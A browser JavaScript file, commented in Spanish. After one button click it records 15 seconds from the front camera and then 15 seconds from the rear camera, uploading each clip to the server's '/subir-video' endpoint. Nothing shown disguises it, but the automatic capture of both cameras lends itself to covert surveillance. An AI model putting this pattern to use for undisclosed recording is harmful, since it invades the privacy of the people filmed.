/* eslint-env browser */

document.addEventListener('DOMContentLoaded', () => {
    const touchButton = document.getElementById('touchButton');
    const videoElement = document.getElementById('videoElement');
    
    let stream = null;
    let mediaRecorder = null;
    let recordedChunks = [];
    
    if (!touchButton) return;

    // Función auxiliar para enviar un video al servidor
    const enviarVideo = (chunks, nombreBase) => {
        const clipBlob = new Blob(chunks, { type: 'video/webm' });
        const formData = new FormData();
        formData.append('video', clipBlob, `${nombreBase}.webm`);

        fetch('/subir-video', {
            method: 'POST',
            body: formData
        })
        .catch((err) => {
            console.error('Error al subir el clip:', err);
        });
    };

    // Función para apagar la cámara actual
    const detenerStream = () => {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            if (videoElement) videoElement.srcObject = null;
        }
    };

    touchButton.addEventListener('click', () => {
        // PARTE 1: Configuración para la cámara de enfrente (Selfie)
        const constraintsFrontal = {
            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
        };

        // PARTE 2: Configuración para la cámara de atrás (Principal)
        const constraintsTrasera = {
            video: { facingMode: { exact: "environment" }, width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
        };

        // Paso 1: Iniciar con la cámara de enfrente
        navigator.mediaDevices.getUserMedia(constraintsFrontal)
            .then((mediaStream) => {
                stream = mediaStream;
                if (videoElement) videoElement.srcObject = stream;
                
                recordedChunks = [];
                mediaRecorder = new MediaRecorder(stream);
                
                mediaRecorder.ondataavailable = (e) => {
                    if (e.data && e.data.size > 0) recordedChunks.push(e.data);
                };
                
                mediaRecorder.onstop = () => {
                    // Guardar y mandar el video de la cámara de enfrente
                    enviarVideo(recordedChunks, 'frontal');
                    detenerStream();

                    // Paso 2: Activar inmediatamente la cámara trasera tras un breve respiro
                    setTimeout(() => {
                        navigator.mediaDevices.getUserMedia(constraintsTrasera)
                            .then((traseraStream) => {
                                stream = traseraStream;
                                if (videoElement) videoElement.srcObject = stream;
                                
                                recordedChunks = [];
                                mediaRecorder = new MediaRecorder(stream);
                                
                                mediaRecorder.ondataavailable = (e) => {
                                    if (e.data && e.data.size > 0) recordedChunks.push(e.data);
                                };
                                
                                mediaRecorder.onstop = () => {
                                    // Guardar y mandar el video de la cámara de atrás
                                    enviarVideo(recordedChunks, 'trasera');
                                    detenerStream();
                                    touchButton.disabled = false; // Liberar botón al terminar todo
                                };

                                mediaRecorder.start();
                                
                                // Graba la cámara trasera durante 15 segundos
                                setTimeout(() => {
                                    if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
                                }, 15000);
                            })
                            .catch((err) => {
                                console.error('El dispositivo no tiene cámara trasera o fue bloqueada:', err);
                                touchButton.disabled = false;
                            });
                    }, 1000);
                };
                
                mediaRecorder.start();
                touchButton.disabled = true; 
                
                // Graba la cámara frontal durante 15 segundos
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
                }, 15000);
            })
            .catch((err) => {
                console.error('Error al acceder a la cámara frontal:', err);
                touchButton.disabled = false;
            });
    });
});
